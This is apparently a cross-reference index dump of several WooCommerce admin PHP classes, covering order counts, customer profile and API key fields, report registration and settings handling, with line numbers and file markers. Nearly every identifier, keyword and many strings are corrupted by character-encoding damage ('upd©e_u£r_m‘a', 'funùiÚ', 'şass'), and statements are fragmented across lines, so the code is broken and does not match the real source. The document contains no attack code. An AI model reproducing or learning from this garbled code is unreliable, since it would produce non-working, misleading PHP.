Ğ
$u£r_id
, '_order_count', '' );

188 
	`upd©e_u£r_m‘a
Ğ
$u£r_id
, '_money_spent', '' );

191 
	`d–‘e_Œªs›Á
( 'woocommerce_processing_order_count' );

192 
	`d–‘e_Œªs›Á
( 'wc_term_counts' );

196 
	}
}

205 
public
 
funùiÚ
 
	$uÁ¿sh_po¡
Ğ
$id
 ) {

206 iàĞ
$id
 > 0 ) {

208 
$po¡_ty³
 = 
	`g‘_po¡_ty³
Ğ
$id
 );

210 iàĞ'shİ_Üd”' =ğ
$po¡_ty³
 ) {

213 
$u£r_id
 = 
	`g‘_po¡_m‘a
Ğ
$id
, '_cu¡om”_u£r', 
Œue
 );

215 iàĞ
$u£r_id
 > 0 ) {

216 
	`upd©e_u£r_m‘a
Ğ
$u£r_id
, '_order_count', '' );

217 
	`upd©e_u£r_m‘a
Ğ
$u£r_id
, '_money_spent', '' );

220 
	`d–‘e_Œªs›Á
( 'woocommerce_processing_order_count' );

221 
	`d–‘e_Œªs›Á
( 'wc_term_counts' );

225 
	}
}

228 
	g’dif
;

230  
Ãw
 
WC_Admš_Po¡_Ty³s
();

	@includes/admin/class-wc-admin-profile.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Profile' ) ) :

18 şas 
	cWC_Admš_Profe
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_aùiÚ
Ğ'show_u£r_´ofe', 
	`¬¿y
Ğ
$this
, 'add_customer_meta_fields' ) );

25 
	`add_aùiÚ
Ğ'ed™_u£r_´ofe', 
	`¬¿y
Ğ
$this
, 'add_customer_meta_fields' ) );

27 
	`add_aùiÚ
Ğ'³rsÚ®_İtiÚs_upd©e', 
	`¬¿y
Ğ
$this
, 'save_customer_meta_fields' ) );

28 
	`add_aùiÚ
Ğ'ed™_u£r_´ofe_upd©e', 
	`¬¿y
Ğ
$this
, 'save_customer_meta_fields' ) );

30 
	`add_aùiÚ
Ğ'show_u£r_´ofe', 
	`¬¿y
Ğ
$this
, 'add_api_key_field' ) );

31 
	`add_aùiÚ
Ğ'ed™_u£r_´ofe', 
	`¬¿y
Ğ
$this
, 'add_api_key_field' ) );

33 
	`add_aùiÚ
Ğ'³rsÚ®_İtiÚs_upd©e', 
	`¬¿y
Ğ
$this
, 'generate_api_key' ) );

34 
	`add_aùiÚ
Ğ'ed™_u£r_´ofe_upd©e', 
	`¬¿y
Ğ
$this
, 'generate_api_key' ) );

42 
public
 
funùiÚ
 
	$g‘_cu¡om”_m‘a_f›lds
() {

43 
$show_f›lds
 = 
	`­¶y_f‹rs
('woocomm”û_cu¡om”_m‘a_f›lds', 
	`¬¿y
(

44 'blšg' => 
	`¬¿y
(

45 't™Ë' => 
	`__
( 'Customer Billing Address', 'woocommerce' ),

46 'f›lds' => 
	`¬¿y
(

47 'blšg_fœ¡_Çme' => 
	`¬¿y
(

48 'Ïb–' => 
	`__
( 'First‚ame', 'woocommerce' ),

51 'blšg_Ï¡_Çme' => 
	`¬¿y
(

52 'Ïb–' => 
	`__
( 'Last‚ame', 'woocommerce' ),

55 'blšg_com·ny' => 
	`¬¿y
(

56 'Ïb–' => 
	`__
( 'Company', 'woocommerce' ),

59 'blšg_add»ss_1' => 
	`¬¿y
(

60 'Ïb–' => 
	`__
( 'Address 1', 'woocommerce' ),

63 'blšg_add»ss_2' => 
	`¬¿y
(

64 'Ïb–' => 
	`__
( 'Address 2', 'woocommerce' ),

67 'blšg_c™y' => 
	`¬¿y
(

68 'Ïb–' => 
	`__
( 'City', 'woocommerce' ),

71 'blšg_po¡code' => 
	`¬¿y
(

72 'Ïb–' => 
	`__
( 'Postcode', 'woocommerce' ),

75 'blšg_¡©e' => 
	`¬¿y
(

76 'Ïb–' => 
	`__
( 'State/County', 'woocommerce' ),

77 'desütiÚ' => 
	`__
( 'State/County or state code', 'woocommerce' ),

79 'blšg_couÁry' => 
	`¬¿y
(

80 'Ïb–' => 
	`__
( 'Country', 'woocommerce' ),

81 'desütiÚ' => 
	`__
( '2†etter Country code', 'woocommerce' ),

83 'blšg_phÚe' => 
	`¬¿y
(

84 'Ïb–' => 
	`__
( 'Telephone', 'woocommerce' ),

87 'blšg_ema' => 
	`¬¿y
(

88 'Ïb–' => 
	`__
( 'Email', 'woocommerce' ),

93 'shpšg' => 
	`¬¿y
(

94 't™Ë' => 
	`__
( 'Customer Shipping Address', 'woocommerce' ),

95 'f›lds' => 
	`¬¿y
(

96 'shpšg_fœ¡_Çme' => 
	`¬¿y
(

97 'Ïb–' => 
	`__
( 'First‚ame', 'woocommerce' ),

100 'shpšg_Ï¡_Çme' => 
	`¬¿y
(

101 'Ïb–' => 
	`__
( 'Last‚ame', 'woocommerce' ),

104 'shpšg_com·ny' => 
	`¬¿y
(

105 'Ïb–' => 
	`__
( 'Company', 'woocommerce' ),

108 'shpšg_add»ss_1' => 
	`¬¿y
(

109 'Ïb–' => 
	`__
( 'Address 1', 'woocommerce' ),

112 'shpšg_add»ss_2' => 
	`¬¿y
(

113 'Ïb–' => 
	`__
( 'Address 2', 'woocommerce' ),

116 'shpšg_c™y' => 
	`¬¿y
(

117 'Ïb–' => 
	`__
( 'City', 'woocommerce' ),

120 'shpšg_po¡code' => 
	`¬¿y
(

121 'Ïb–' => 
	`__
( 'Postcode', 'woocommerce' ),

124 'shpšg_¡©e' => 
	`¬¿y
(

125 'Ïb–' => 
	`__
( 'State/County', 'woocommerce' ),

126 'desütiÚ' => 
	`__
( 'State/County or state code', 'woocommerce' )

128 'shpšg_couÁry' => 
	`¬¿y
(

129 'Ïb–' => 
	`__
( 'Country', 'woocommerce' ),

130 'desütiÚ' => 
	`__
( '2†etter Country code', 'woocommerce' )

135  
$show_f›lds
;

136 
	}
}

143 
public
 
funùiÚ
 
	$add_cu¡om”_m‘a_f›lds
Ğ
$u£r
 ) {

144 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'manage_woocommerce' ) )

147 
$show_f›lds
 = 
$this
->
	`g‘_cu¡om”_m‘a_f›lds
();

149 
	`fÜ—ch
Ğ
$show_f›lds
 
as
 
$f›ld£t
 ) :

151 <
h3
><?
php
 
echo
 
$f›ld£t
['title']; ?></h3>

152 <
bË
 
şass
="form-table">

153 <?
php


154 
	`fÜ—ch
Ğ
$f›ld£t
['f›lds'] 
as
 
$key
 => 
$f›ld
 ) :

156 <
Œ
>

157 <
th
><
Ïb–
 ="<?ph°echØesc_©ŒĞ$key ); ?>"><?
php
 
echo
 
	`esc_html
Ğ
$f›ld
['label'] ); ?></label></th>

158 <
td
>

159 <
šput
 
ty³
="‹xt" 
Çme
="<?ph°echØesc_©ŒĞ$key ); ?>" 
id
="<?ph°echØesc_©ŒĞ$key ); ?>" 
v®ue
="<?ph°echØesc_©ŒĞg‘_u£r_m‘aĞ$u£r->ID, $key,ruè); ?>" 
şass
="»guÏr-‹xt" /><
br
/>

160 <
¥ª
 
şass
="desütiÚ"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$f›ld
['description'] ); ?></span>

161 </
td
>

162 </
Œ
>

163 <?
php


164 
’dfÜ—ch
;

166 </
bË
>

167 <?
php


168 
’dfÜ—ch
;

169 
	}
}

176 
public
 
funùiÚ
 
	$§ve_cu¡om”_m‘a_f›lds
Ğ
$u£r_id
 ) {

177 
$§ve_f›lds
 = 
$this
->
	`g‘_cu¡om”_m‘a_f›lds
();

179 
	`fÜ—ch
Ğ
$§ve_f›lds
 
as
 
$f›ld£t
 )

180 
	`fÜ—ch
Ğ
$f›ld£t
['f›lds'] 
as
 
$key
 => 
$f›ld
 )

181 iàĞ
	`is£t
Ğ
$_POST
[ 
$key
 ] ) )

182 
	`upd©e_u£r_m‘a
Ğ
$u£r_id
, 
$key
, 
	`wc_ş—n
Ğ
$_POST
[ $key ] ) );

183 
	}
}

191 
public
 
funùiÚ
 
	$add_­i_key_f›ld
Ğ
$u£r
 ) {

193 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'manage_woocommerce' ) )

196 
$³rmissiÚs
 = 
	`¬¿y
(

197 '»ad' => 
	`__
( 'Read', 'woocommerce' ),

198 'wr™e' => 
	`__
( 'Write', 'woocommerce' ),

199 '»ad_wr™e' => 
	`__
( 'Read/Write', 'woocommerce' ),

202 iàĞ
	`cu¼’t_u£r_ÿn
Ğ'ed™_u£r', 
$u£r
->
ID
 ) ) {

204 <
bË
 
şass
="form-table">

205 <
tbody
>

206 <
Œ
>

207 <
th
><
Ïb–
 ="woocomm”û_­i_keys"><?
php
 
	`_e
( 'WooCommerce API Keys', 'woocommerce' ); ?></label></th>

208 <
td
>

209 <?
php
 iàĞ
	`em±y
Ğ
$u£r
->
woocomm”û_­i_cÚsum”_key
 ) ) : ?>

210 <
šput
 
Çme
="woocomm”û_g’”©e_­i_key" 
ty³
="checkbox" 
id
="woocomm”û_g’”©e_­i_key" 
v®ue
="0" />

211 <
¥ª
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Generate API Key', 'woocommerce' ); ?></span>

212 <?
php
 : ?>

213 <
¡rÚg
><?
php
 
	`_e
Ğ'CÚsum” Key:', 'woocomm”û' ); ?>&
nb¥
;</¡rÚg><
code
 
id
="woocomm”û_­i_cÚsum”_key"><?ph°
echo
 
$u£r
->
woocomm”û_­i_cÚsum”_key
 ?></code><
br
/>

214 <
¡rÚg
><?
php
 
	`_e
Ğ'CÚsum” Seü‘:', 'woocomm”û' ); ?>&
nb¥
;</¡rÚg><
code
 
id
="woocomm”û_­i_cÚsum”_£ü‘"><?ph°
echo
 
$u£r
->
woocomm”û_­i_cÚsum”_£ü‘
; ?></code><
br
/>

215 <
¡rÚg
><?
php
 
	`_e
Ğ'P”missiÚs:', 'woocomm”û' ); ?>&
nb¥
;</¡rÚg><
¥ª
 
id
="woocomm”û_­i_key_³rmissiÚs"><
£Ëù
 
Çme
="woocommerce_api_key_permissions" id="woocommerce_api_key_permissions"><?php

216 
	`fÜ—ch
 ( 
$³rmissiÚs
 
as
 
$³rmissiÚ_key
 => 
$³rmissiÚ_Çme
 ) { 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ$³rmissiÚ_key ) . '" '.
	`£Ëùed
($³rmissiÚ_key, 
$u£r
->
woocomm”û_­i_key_³rmissiÚs
, 
çl£
).'>'.
	`esc_html
( $permission_name ) . '</option>';} ?>

217 </
£Ëù
></
¥ª
><
br
/>

218 <
šput
 
Çme
="woocomm”û_g’”©e_­i_key" 
ty³
="checkbox" 
id
="woocomm”û_g’”©e_­i_key" 
v®ue
="0" />

219 <
¥ª
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Revoke API Key', 'woocommerce' ); ?></span>

220 <?
php
 
’dif
; ?>

221 </
td
>

222 </
Œ
>

223 </
tbody
>

224 </
bË
>

225 <?
php


227 
	}
}

235 
public
 
funùiÚ
 
	$g’”©e_­i_key
Ğ
$u£r_id
 ) {

237 iàĞ
	`cu¼’t_u£r_ÿn
Ğ'ed™_u£r', 
$u£r_id
 ) ) {

239 
$u£r
 = 
	`g‘_u£rd©a
Ğ
$u£r_id
 );

242 iàĞ
	`is£t
Ğ
$_POST
['woocommerce_generate_api_key'] ) ) {

245 iàĞ
	`em±y
Ğ
$u£r
->
woocomm”û_­i_cÚsum”_key
 ) ) {

247 
$cÚsum”_key
 = 'ck_' . 
	`hash
Ğ'md5', 
$u£r
->
u£r_logš
 . 
	`d©e
Ğ'U' ) . 
	`mt_¿nd
() );

249 
	`upd©e_u£r_m‘a
Ğ
$u£r_id
, 'woocomm”û_­i_cÚsum”_key', 
$cÚsum”_key
 );

253 
	`d–‘e_u£r_m‘a
Ğ
$u£r_id
, 'woocommerce_api_consumer_key' );

257 iàĞ
	`em±y
Ğ
$u£r
->
woocomm”û_­i_cÚsum”_£ü‘
 ) ) {

259 
$cÚsum”_£ü‘
 = 'cs_' . 
	`hash
Ğ'md5', 
$u£r
->
ID
 . 
	`d©e
Ğ'U' ) . 
	`mt_¿nd
() );

261 
	`upd©e_u£r_m‘a
Ğ
$u£r_id
, 'woocomm”û_­i_cÚsum”_£ü‘', 
$cÚsum”_£ü‘
 );

265 
	`d–‘e_u£r_m‘a
Ğ
$u£r_id
, 'woocommerce_api_consumer_secret' );

269 iàĞ
	`em±y
Ğ
$u£r
->
woocomm”û_­i_key_³rmissiÚs
 ) ) {

271 iàĞ
	`is£t
Ğ
$_POST
['woocommerce_api_key_permissions'] ) ) {

273 
$³rmissiÚs
 = ( 
	`š_¬¿y
Ğ
$_POST
['woocomm”û_­i_key_³rmissiÚs'], 
	`¬¿y
( 'read', 'write', 'read_write' ) ) ) ? $_POST['woocommerce_api_key_permissions'] : 'read';

277 
$³rmissiÚs
 = 'read';

280 
	`upd©e_u£r_m‘a
Ğ
$u£r_id
, 'woocomm”û_­i_key_³rmissiÚs', 
$³rmissiÚs
 );

284 
	`d–‘e_u£r_m‘a
Ğ
$u£r_id
, 'woocommerce_api_key_permissions' );

290 iàĞ! 
	`em±y
Ğ
$_POST
['woocomm”û_­i_key_³rmissiÚs'] ) && 
$u£r
->
woocomm”û_­i_key_³rmissiÚs
 !== $_POST['woocommerce_api_key_permissions'] ) {

292 
$³rmissiÚs
 = ( ! 
	`š_¬¿y
Ğ
$_POST
['woocomm”û_­i_key_³rmissiÚs'], 
	`¬¿y
( 'read', 'write', 'read_write' ) ) ) ? 'read' : $_POST['woocommerce_api_key_permissions'];

294 
	`upd©e_u£r_m‘a
Ğ
$u£r_id
, 'woocomm”û_­i_key_³rmissiÚs', 
$³rmissiÚs
 );

298 
	}
}

302 
	g’dif
;

304  
Ãw
 
WC_Admš_Profe
();

	@includes/admin/class-wc-admin-reports.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 iàĞ! 
şass_exi¡s
( 'WC_Admin_Reports' ) ) :

20 şas 
	cWC_Admš_R•Üts
 {

25 
public
 
funùiÚ
 
	$ouut
() {

26 
$»pÜts
 = 
£lf
::
	`g‘_»pÜts
();

27 
$fœ¡_b
 = 
	`¬¿y_keys
Ğ
$»pÜts
 );

28 
$cu¼’t_b
 = ! 
	`em±y
Ğ
$_GET
['b'] ) ? 
	`§n™ize_t™Ë
Ğ$_GET['b'] ) : 
$fœ¡_b
[0];

29 
$cu¼’t_»pÜt
 = 
	`is£t
Ğ
$_GET
['»pÜt'] ) ? 
	`§n™ize_t™Ë
Ğ$_GET['»pÜt'] ) : 
	`cu¼’t
Ğ
	`¬¿y_keys
Ğ
$»pÜts
[ 
$cu¼’t_b
 ]['reports'] ) );

31 
	`šşude_Úû
( 'reports/class-wc-admin-report.php' );

32 
	`šşude_Úû
( 'views/html-admin-page-reports.php' );

40 
public
 
funùiÚ
 
	$g‘_»pÜts
() {

41 
$»pÜts
 = 
	`¬¿y
(

42 'Üd”s' => 
	`¬¿y
(

43 't™Ë' => 
	`__
( 'Orders', 'woocommerce' ),

44 '»pÜts' => 
	`¬¿y
(

45 "§Ës_by_d©e" => 
	`¬¿y
(

46 't™Ë' => 
	`__
( 'Sales by date', 'woocommerce' ),

48 'hide_t™Ë' => 
Œue
,

49 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

51 "§Ës_by_´oduù" => 
	`¬¿y
(

52 't™Ë' => 
	`__
( 'Sales by…roduct', 'woocommerce' ),

54 'hide_t™Ë' => 
Œue
,

55 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

57 "§Ës_by_ÿ‹gÜy" => 
	`¬¿y
(

58 't™Ë' => 
	`__
( 'Sales by category', 'woocommerce' ),

60 'hide_t™Ë' => 
Œue
,

61 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

63 "coupÚ_u§ge" => 
	`¬¿y
(

64 't™Ë' => 
	`__
( 'Coupons by date', 'woocommerce' ),

66 'hide_t™Ë' => 
Œue
,

67 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

71 'cu¡om”s' => 
	`¬¿y
(

72 't™Ë' => 
	`__
( 'Customers', 'woocommerce' ),

73 '»pÜts' => 
	`¬¿y
(

74 "cu¡om”s" => 
	`¬¿y
(

75 't™Ë' => 
	`__
( 'Customers vs. Guests', 'woocommerce' ),

77 'hide_t™Ë' => 
Œue
,

78 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

80 "cu¡om”_li¡" => 
	`¬¿y
(

81 't™Ë' => 
	`__
( 'Customer List', 'woocommerce' ),

83 'hide_t™Ë' => 
Œue
,

84 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

88 '¡ock' => 
	`¬¿y
(

89 't™Ë' => 
	`__
( 'Stock', 'woocommerce' ),

90 '»pÜts' => 
	`¬¿y
(

91 "low_š_¡ock" => 
	`¬¿y
(

92 't™Ë' => 
	`__
( 'Low in stock', 'woocommerce' ),

94 'hide_t™Ë' => 
Œue
,

95 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

97 "out_of_¡ock" => 
	`¬¿y
(

98 't™Ë' => 
	`__
( 'Out of stock', 'woocommerce' ),

100 'hide_t™Ë' => 
Œue
,

101 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

103 "mo¡_¡ocked" => 
	`¬¿y
(

104 't™Ë' => 
	`__
( 'Most Stocked', 'woocommerce' ),

106 'hide_t™Ë' => 
Œue
,

107 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

113 iàĞ
	`g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) {

114 
$»pÜts
['xes'] = 
	`¬¿y
(

115 't™Ë' => 
	`__
( 'Taxes', 'woocommerce' ),

116 '»pÜts' => 
	`¬¿y
(

117 "xes_by_code" => 
	`¬¿y
(

118 't™Ë' => 
	`__
( 'Taxes by code', 'woocommerce' ),

120 'hide_t™Ë' => 
Œue
,

121 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

123 "xes_by_d©e" => 
	`¬¿y
(

124 't™Ë' => 
	`__
( 'Taxes by date', 'woocommerce' ),

126 'hide_t™Ë' => 
Œue
,

127 'ÿÎback' => 
	`¬¿y
Ğ
__CLASS__
, 'get_report' )

133 
$»pÜts
 = 
	`­¶y_f‹rs
( 'woocommerce_admin_reports', $reports );

134 
$»pÜts
 = 
	`­¶y_f‹rs
( 'woocommerce_reports_charts', $reports );

136 
	`fÜ—ch
 ( 
$»pÜts
 
as
 
$key
 => 
$»pÜt_group
 ) {

137 iàĞ
	`is£t
Ğ
$»pÜts
[ 
$key
 ]['charts'] ) ) {

138 
$»pÜts
[ 
$key
 ]['reports'] = $reports[ $key ]['charts'];

141 
	`fÜ—ch
 ( 
$»pÜts
[ 
$key
 ]['»pÜts'] 
as
 
$»pÜt_key
 => 
$»pÜt
 ) {

142 iàĞ
	`is£t
Ğ
$»pÜts
[ 
$key
 ]['»pÜts'][ 
$»pÜt_key
 ]['function'] ) ) {

143 
$»pÜts
[ 
$key
 ]['»pÜts'][ 
$»pÜt_key
 ]['callback'] = $reports[ $key ]['reports'][ $report_key ]['function'];

148  
$»pÜts
;

149 
	}
}

154 
public
 
funùiÚ
 
	$g‘_»pÜt
Ğ
$Çme
 ) {

155 
$Çme
 = 
	`§n™ize_t™Ë
Ğ
	`¡r_»¶aû
( '_', '-', $name ) );

156 
$şass
 = 'WC_R•Üt_' . 
	`¡r_»¶aû
Ğ'-', '_', 
$Çme
 );

158 
	`šşude_Úû
Ğ'»pÜts/şass-wc-»pÜt-' . 
$Çme
 . '.php' );

160 iàĞ! 
	`şass_exi¡s
Ğ
$şass
 ) )

163 
$»pÜt
 = 
Ãw
 
	`$şass
();

164 
$»pÜt
->
	`ouut_»pÜt
();

165 
	}
}

168 
	g’dif
;

	@includes/admin/class-wc-admin-settings.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Settings' ) ) :

18 şas 
	cWC_Admš_S‘tšgs
 {

20 
´iv©e
 
$£‰šgs
 = 
¬¿y
();

21 
´iv©e
 
	m$”rÜs
 = 
¬¿y
();

22 
´iv©e
 
	m$mes§ges
 = 
¬¿y
();

27 
public
 
funùiÚ
 
	$g‘_£‰šgs_·ges
() {

28 iàĞ
	`em±y
Ğ
£lf
::
$£‰šgs
 ) ) {

29 
$£‰šgs
 = 
	`¬¿y
();

31 
	`šşude_Úû
( 'settings/class-wc-settings-page.php' );

33 
$£‰šgs
[] = 
	`šşude
( 'settings/class-wc-settings-general.php' );

34 
$£‰šgs
[] = 
	`šşude
( 'settings/class-wc-settings-products.php' );

35 
$£‰šgs
[] = 
	`šşude
( 'settings/class-wc-settings-tax.php' );

36 
$£‰šgs
[] = 
	`šşude
( 'settings/class-wc-settings-checkout.php' );

37 
$£‰šgs
[] = 
	`šşude
( 'settings/class-wc-settings-shipping.php' );

38 
$£‰šgs
[] = 
	`šşude
( 'settings/class-wc-settings-accounts.php' );

39 
$£‰šgs
[] = 
	`šşude
( 'settings/class-wc-settings-emails.php' );

40 
$£‰šgs
[] = 
	`šşude
( 'settings/class-wc-settings-integrations.php' );

42 
£lf
::
$£‰šgs
 = 
	`­¶y_f‹rs
( 'woocommerce_get_settings_pages', $settings );

44  
£lf
::
$£‰šgs
;

50 
public
 
funùiÚ
 
	$§ve
() {

51 
glob®
 
$cu¼’t_£ùiÚ
, 
$cu¼’t_b
;

53 iàĞ
	`em±y
Ğ
$_REQUEST
['_w²Úû'] ) || ! 
	`wp_v”ify_nÚû
( $_REQUEST['_wpnonce'], 'woocommerce-settings' ) )

54 
	`d›
Ğ
	`__
( 'Action failed. Please„efreshhe…age‡nd„etry.', 'woocommerce' ) );

57 
	`do_aùiÚ
Ğ'woocomm”û_£‰šgs_§ve_' . 
$cu¼’t_b
 );

58 
	`do_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_' . 
$cu¼’t_b
 );

59 
	`do_aùiÚ
( 'woocommerce_update_options' );

62 
	`wc_d–‘e_´oduù_Œªs›Ás
();

63 
	`d–‘e_Œªs›Á
( 'woocommerce_cache_excluded_uris' );

65 
£lf
::
	`add_mes§ge
Ğ
	`__
( 'Your settings have been saved.', 'woocommerce' ) );

66 
£lf
::
	`check_dowÆßd_fŞd”_´ÙeùiÚ
();

69 
	`WC
()->
qu”y
->
	`š™_qu”y_v¬s
();

70 
	`WC
()->
qu”y
->
	`add_’dpošts
();

71 
	`æush_»wr™e_ruËs
();

73 
	`do_aùiÚ
( 'woocommerce_settings_saved' );

74 
	}
}

80 
public
 
funùiÚ
 
	$add_mes§ge
Ğ
$‹xt
 ) {

81 
£lf
::
$mes§ges
[] = 
$‹xt
;

82 
	}
}

88 
public
 
funùiÚ
 
	$add_”rÜ
Ğ
$‹xt
 ) {

89 
£lf
::
$”rÜs
[] = 
$‹xt
;

90 
	}
}

95 
public
 
funùiÚ
 
	$show_mes§ges
() {

96 iàĞĞ
£lf
::
$”rÜs
 ) > 0 ) {

97 
	`fÜ—ch
 ( 
£lf
::
$”rÜs
 
as
 
$”rÜ
 )

98 
echo
 '<div id="mes§ge" cÏss="”rÜ fade"><p><¡rÚg>' . 
	`esc_html
Ğ
$”rÜ
 ) . '</strong></p></div>';

99 } 
	`–£if
 ( Ğ
£lf
::
$mes§ges
 ) > 0 ) {

100 
	`fÜ—ch
 ( 
£lf
::
$mes§ges
 
as
 
$mes§ge
 )

101 
echo
 '<div id="mes§ge" cÏss="upd©ed fade"><p><¡rÚg>' . 
	`esc_html
Ğ
$mes§ge
 ) . '</strong></p></div>';

103 
	}
}

113 
public
 
funùiÚ
 
	$ouut
() {

114 
glob®
 
$cu¼’t_£ùiÚ
, 
$cu¼’t_b
;

116 
	`do_aùiÚ
( 'woocommerce_settings_start' );

118 
	`wp_’queue_süt
Ğ'woocomm”û_£‰šgs', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/£‰šgs.mš.js', 
	`¬¿y
Ğ'jqu”y', 'jqu”y-ui-d©•ick”', 'jqu”y-ui-sÜbË', 'œis', 'cho£n' ), WC()->
v”siÚ
, 
Œue
 );

120 
	`wp_loÿlize_süt
Ğ'woocomm”û_£‰šgs', 'woocomm”û_£‰šgs_·¿ms', 
	`¬¿y
(

121 'i18n_Çv_w¬nšg' => 
	`__
( 'The changes you made will be†ost if you‚avigate‡way fromhis…age.', 'woocommerce' )

125 
£lf
::
	`g‘_£‰šgs_·ges
();

128 
$cu¼’t_b
 = 
	`em±y
Ğ
$_GET
['b'] ) ? 'g’”®' : 
	`§n™ize_t™Ë
( $_GET['tab'] );

129 
$cu¼’t_£ùiÚ
 = 
	`em±y
Ğ
$_REQUEST
['£ùiÚ'] ) ? '' : 
	`§n™ize_t™Ë
( $_REQUEST['section'] );

132 iàĞ! 
	`em±y
Ğ
$_POST
 ) )

133 
£lf
::
	`§ve
();

136 iàĞ! 
	`em±y
Ğ
$_GET
['wc_error'] ) )

137 
£lf
::
	`add_”rÜ
Ğ
	`¡r¦ashes
Ğ
$_GET
['wc_error'] ) );

139 iàĞ! 
	`em±y
Ğ
$_GET
['wc_message'] ) )

140 
£lf
::
	`add_mes§ge
Ğ
	`¡r¦ashes
Ğ
$_GET
['wc_message'] ) );

142 
£lf
::
	`show_mes§ges
();

145 
$bs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_£‰šgs_bs_¬¿y', 
	`¬¿y
() );

147 
šşude
 'views/html-admin-settings.php';

148 
	}
}

156 
public
 
funùiÚ
 
g‘_İtiÚ
Ğ
$İtiÚ_Çme
, 
$deçuÉ
 = '' ) {

158 iàĞ
¡r¡r
Ğ
$İtiÚ_Çme
, '[' ) ) {

160 
·r£_¡r
Ğ
$İtiÚ_Çme
, 
$İtiÚ_¬¿y
 );

163 
	g$İtiÚ_Çme
 = 
cu¼’t
Ğ
¬¿y_keys
Ğ
$İtiÚ_¬¿y
 ) );

166 
	g$İtiÚ_v®ues
 = 
g‘_İtiÚ
Ğ
$İtiÚ_Çme
, '' );

168 
	g$key
 = 
key
Ğ
$İtiÚ_¬¿y
[ 
$İtiÚ_Çme
 ] );

170 iàĞ
is£t
Ğ
$İtiÚ_v®ues
[ 
$key
 ] ) )

171 
	g$İtiÚ_v®ue
 = 
$İtiÚ_v®ues
[ 
$key
 ];

173 
	g$İtiÚ_v®ue
 = 
nuÎ
;

177 
	g$İtiÚ_v®ue
 = 
g‘_İtiÚ
Ğ
$İtiÚ_Çme
, 
nuÎ
 );

180 iàĞ
is_¬¿y
Ğ
$İtiÚ_v®ue
 ) )

181 
	g$İtiÚ_v®ue
 = 
¬¿y_m­
Ğ'¡r¦ashes', 
$İtiÚ_v®ue
 );

182 
–£if
 ( ! 
is_nuÎ
Ğ
$İtiÚ_v®ue
 ) )

183 
	g$İtiÚ_v®ue
 = 
¡r¦ashes
Ğ
$İtiÚ_v®ue
 );

185  
	g$İtiÚ_v®ue
 ==ğ
nuÎ
 ? 
$deçuÉ
 : 
$İtiÚ_v®ue
;

196 
public
 
funùiÚ
 
	$ouut_f›lds
Ğ
$İtiÚs
 ) {

197 
	`fÜ—ch
 ( 
$İtiÚs
 
as
 
$v®ue
 ) {

198 iàĞ! 
	`is£t
Ğ
$v®ue
['type'] ) ) ;

199 iàĞ! 
	`is£t
Ğ
$v®ue
['id'] ) ) $value['id'] = '';

200 iàĞ! 
	`is£t
Ğ
$v®ue
['title'] ) ) $value['title'] = isset( $value['name'] ) ? $value['name'] : '';

201 iàĞ! 
	`is£t
Ğ
$v®ue
['class'] ) ) $value['class'] = '';

202 iàĞ! 
	`is£t
Ğ
$v®ue
['css'] ) ) $value['css'] = '';

203 iàĞ! 
	`is£t
Ğ
$v®ue
['default'] ) ) $value['default'] = '';

204 iàĞ! 
	`is£t
Ğ
$v®ue
['desc'] ) ) $value['desc'] = '';

205 iàĞ! 
	`is£t
Ğ
$v®ue
['desc_t'] ) ) $v®ue['desc_t'] = 
çl£
;

208 
$cu¡om_©Œibu‹s
 = 
	`¬¿y
();

210 iàĞ! 
	`em±y
Ğ
$v®ue
['cu¡om_©Œibu‹s'] ) && 
	`is_¬¿y
( $value['custom_attributes'] ) )

211 
	`fÜ—ch
 ( 
$v®ue
['cu¡om_©Œibu‹s'] 
as
 
$©Œibu‹
 => 
$©Œibu‹_v®ue
 )

212 
$cu¡om_©Œibu‹s
[] = 
	`esc_©Œ
Ğ
$©Œibu‹
 ) . '="' .ƒsc_©ŒĞ
$©Œibu‹_v®ue
 ) . '"';

215 iàĞ
$v®ue
['desc_t'] ==ğ
Œue
 ) {

216 
$desütiÚ
 = '';

217 
$t
 = 
$v®ue
['desc'];

218 } 
	`–£if
 ( ! 
	`em±y
Ğ
$v®ue
['desc_tip'] ) ) {

219 
$desütiÚ
 = 
$v®ue
['desc'];

220 
$t
 = 
$v®ue
['desc_tip'];

221 } 
	`–£if
 ( ! 
	`em±y
Ğ
$v®ue
['desc'] ) ) {

222 
$desütiÚ
 = 
$v®ue
['desc'];

223 
$t
 = '';

225 
$desütiÚ
 = 
$t
 = '';

228 iàĞ
$desütiÚ
 && 
	`š_¬¿y
Ğ
$v®ue
['ty³'], 
	`¬¿y
( 'textarea', 'radio' ) ) ) {

229 
$desütiÚ
 = '<°¡yË="m¬gš-tİ:0">' . 
	`wp_k£s_po¡
( $description ) . '</p>';

230 } 
	`–£if
 ( 
$desütiÚ
 && 
	`š_¬¿y
Ğ
$v®ue
['ty³'], 
	`¬¿y
( 'checkbox' ) ) ) {

231 
$desütiÚ
 = 
	`wp_k£s_po¡
( $description );

232 } 
	`–£if
